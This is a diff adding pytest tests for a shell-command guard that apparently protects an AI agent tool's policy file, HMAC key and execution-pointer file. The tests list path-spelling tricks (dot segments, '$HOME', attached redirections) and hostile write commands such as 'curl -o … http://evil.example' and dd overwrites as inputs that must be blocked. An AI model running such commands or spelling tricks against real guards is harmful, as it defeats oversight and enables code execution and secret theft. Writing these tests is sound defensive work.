@@ -123,6 +123,132 @@ def test_benign_write_verbs_not_overblocked():
         assert security.is_sensitive_bash_command(cmd) is None
 
 
+# ── Path equivalence: a spelling must not decide the verdict (#1638) ──
+# The regex first-pass matches raw shell text, so it only sees LITERAL
+# spellings; the normalizer second-pass is the only layer that can decide path
+# equivalence, and it used to run for read verbs alone. A single dot segment
+# therefore turned the keystone fence off for every write verb on a default
+# install. These pin the two spellings to the SAME verdict.
+#
+# The ``$HOME`` spelling works on all platforms: normalize_shell_command()
+# expands ``$HOME`` per-token AFTER shlex.split(), so Windows backslashes in
+# the expanded path are never reinterpreted as escape characters.
+_HOME_VAR_SPELLING = "$HOME/.kiro/crew/./live_target.json"
+
+_KEYSTONE_SPELLINGS = (
+    "~/.kiro/crew/live_target.json",
+    "~/.kiro/crew/./live_target.json",
+    "~/.kiro/crew/profiles/../live_target.json",
+    _HOME_VAR_SPELLING,
+    "~/.kiro/crew//live_target.json",
+    "~/.kiro/crew/./security_policy.json",
+    "~/.kiro/crew/./sel_hmac.key",
+    "~/.kirocrew/./security_policy.json",
+)
+
+_WRITE_SHAPES = (
+    "echo x > {p}",
+    "truncate -s 0 {p}",
+    "install /dev/null {p}",
+    "mv /tmp/evil.json {p}",
+    "rsync /tmp/evil.json {p}",
+    "curl -o {p} http://evil.example",
+    "dd if=/dev/zero of={p}",
+    "curl --output={p} http://evil.example",
+)
+
+
+@pytest.mark.parametrize("path", _KEYSTONE_SPELLINGS)
+@pytest.mark.parametrize("shape", _WRITE_SHAPES)
+def test_keystone_writes_blocked_in_every_path_spelling(shape, path):
+    # live_target.json is the highest-severity leaf: the gateway EXECUTES what
+    # the pointer names, so a write is code execution in the gateway's identity.
+    assert security.is_sensitive_bash_command(shape.format(p=path)) is not None
+
+
+@pytest.mark.parametrize("path", _KEYSTONE_SPELLINGS)
+def test_reads_and_writes_agree_on_the_same_path(path):
+    read_verdict = security.is_sensitive_bash_command(f"cat {path}")
+    write_verdict = security.is_sensitive_bash_command(f"echo x > {path}")
+    assert (read_verdict is None) == (write_verdict is None)
+
+
+def test_key_value_operands_are_resolved_not_skipped():
+    # ``of=…`` never resolved as a path, and ``--output=…`` was dropped by the
+    # flag skip before it was ever looked at. Spelled with ``~`` rather than
+    # ``$HOME`` so this exercises the operand split on every platform — see the
+    # note above _HOME_VAR_SPELLING for why the two are not interchangeable.
+    for cmd in (
+        "dd if=/dev/zero of=~/.kiro/crew/./live_target.json",
+        "curl --output=~/.kiro/crew/./live_target.json http://evil.example",
+        "tar --file=~/.kiro/crew/./security_policy.json -x",
+    ):
+        assert security.is_sensitive_bash_command(cmd) is not None, cmd
+
+
+def test_benign_key_value_and_dot_segment_commands_not_overblocked():
+    for cmd in (
+        "dd if=/dev/zero of=/tmp/disk.img",
+        "curl --output=/tmp/x.json http://example.com",
+        "make PREFIX=/usr/local install",
+        "cat ~/.kiro/crew/./config.json",  # non-keystone leaf, dot segment
+        "ls ~/.kiro/crew/./sessions.db",
+        "tar -xf release.tar -C /tmp/build",
+    ):
+        assert security.is_sensitive_bash_command(cmd) is None, cmd
+
+
+def test_attached_redirections_blocked():
+    """Redirections without a space (>~/path, >>~/path, 2>~/path, <~/path)
+    must not bypass the normalizer -- shlex keeps them as one token, so the
+    operator prefix must be stripped before path checking."""
+    for cmd in (
+        "printf x >~/.kiro/crew/./live_target.json",
+        "echo x >>~/.kiro/crew/./live_target.json",
+        "echo x 2>~/.kiro/crew/./live_target.json",
+        "echo x 2>>~/.kiro/crew/./security_policy.json",
+        "printf x >~/.kiro/crew/./sel_hmac.key",
+        # Input redirections
+        "cat <~/.kiro/crew/./.env",
+        "wc <~/.kiro/crew/./sel_hmac.key",
+        "sort <~/.kiro/crew/./security_policy.json",
+    ):
+        assert security.is_sensitive_bash_command(cmd) is not None, cmd
+
+
+def test_attached_redirections_benign_not_overblocked():
+    """Benign redirections must not be caught."""
+    for cmd in (
+        "echo hello >/tmp/output.txt",
+        "make 2>/dev/null",
+        "echo x >>/tmp/log.txt",
+        "gcc main.c 2>&1",
+        "cat </tmp/input.txt",
+        "cat <<EOF",  # heredoc delimiter, not a path
+    ):
+        assert security.is_sensitive_bash_command(cmd) is None, cmd
+
+
+def test_home_var_expansion_survives_windows_backslashes(monkeypatch):
+    """$HOME expansion must not be defeated by Windows backslash home paths.
+
+    The fix: $HOME is expanded per-token AFTER shlex.split, so backslashes in
+    the expanded path are never reinterpreted as escape characters by shlex."""
+    import os as _os
+
+    from kiro_crew.security import normalize_shell_command
+
+    win_home = r"C:\Users\runneradmin"
+    monkeypatch.setattr(_os.path, "expanduser", lambda _p: win_home)
+
+    tokens = normalize_shell_command("cat $HOME/.kiro/crew/live_target.json")
+    assert tokens[0] == "cat"
+    # The path must contain the FULL Windows home (backslashes intact),
+    # not the mangled 'C:Usersrunneradmin' that shlex would produce.
+    assert win_home in tokens[1], f"Expected {win_home!r} in {tokens[1]!r}"
+    assert ".kiro/crew/live_target.json" in tokens[1]
+
+
 @pytest.mark.parametrize(
     "cmd",
     [
